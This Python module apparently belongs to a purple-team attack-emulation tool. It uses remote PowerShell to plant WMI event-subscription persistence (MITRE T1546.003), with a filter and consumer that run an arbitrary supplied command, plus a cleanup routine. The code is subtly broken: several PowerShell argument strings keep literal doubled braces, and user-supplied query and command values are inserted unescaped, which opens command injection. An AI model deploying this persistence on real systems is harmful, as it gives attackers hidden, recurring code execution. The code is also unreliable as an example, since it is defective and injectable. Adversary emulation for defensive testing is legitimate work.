from __future__ import annotations

import logging
from typing import Any

from purplestrike.models.techniques import ExecutionStatus, TechniqueResult
from purplestrike.techniques.connection import TargetConnection, get_connection

logger = logging.getLogger(__name__)


async def execute(target: str, parameters: dict[str, Any]) -> TechniqueResult:
    """Create WMI event subscription for persistence."""
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        event_query = parameters.get("event_query", "")
        command = parameters.get("command", "")
        filter_cmd = (
            f"Set-WmiInstance -Class __EventFilter -Arguments "
            "{{Name='PurpleStrikeFilter'; EventNameSpace='root\\cimv2'; "
            f"QueryLanguage='WQL'; Query='{event_query}'}}"
        )
        await conn.run_ps(filter_cmd)
        consumer_cmd = (
            f"Set-WmiInstance -Class CommandLineEventConsumer -Arguments "
            "{{Name='PurpleStrikeConsumer'; "
            f"CommandLineTemplate='{command}'}}"
        )
        await conn.run_ps(consumer_cmd)
        binding_cmd = (
            "Set-WmiInstance -Class __FilterToConsumerBinding -Arguments "
            "{{Filter=(Get-WmiObject __EventFilter -Filter "
            "\"Name='PurpleStrikeFilter'\"); "
            "Consumer=(Get-WmiObject CommandLineEventConsumer -Filter "
            "\"Name='PurpleStrikeConsumer'\")}}"
        )
        result = await conn.run_ps(binding_cmd)
        return TechniqueResult(
            technique_id="T1546.003",
            success=result.success,
            output=result.stdout[:4096],
            error=result.stderr[:1024] if not result.success else None,
            execution_status=ExecutionStatus.SUCCESS if result.success else ExecutionStatus.FAILURE,
        )
    except Exception as e:
        logger.error(f"T1546.003 execution failed: {e}")
        return TechniqueResult(
            technique_id="T1546.003",
            success=False,
            error=str(e),
            execution_status=ExecutionStatus.FAILURE,
        )
    finally:
        if conn:
            await conn.disconnect()


async def cleanup(target: str) -> None:
    """Reverse any changes made during execution."""
    conn: TargetConnection | None = None
    try:
        conn = await get_connection(target)
        await conn.run_ps(
            "Get-WmiObject __FilterToConsumerBinding -Filter "
            "\"Filter.Name='PurpleStrikeFilter'\" | Remove-WmiObject"
        )
        await conn.run_ps(
            "Get-WmiObject CommandLineEventConsumer -Filter "
            "\"Name='PurpleStrikeConsumer'\" | Remove-WmiObject"
        )
        await conn.run_ps(
            "Get-WmiObject __EventFilter -Filter "
            "\"Name='PurpleStrikeFilter'\" | Remove-WmiObject"
        )
    except Exception as e:
        logger.warning(f"T1546.003 cleanup failed: {e}")
    finally:
        if conn:
            await conn.disconnect()
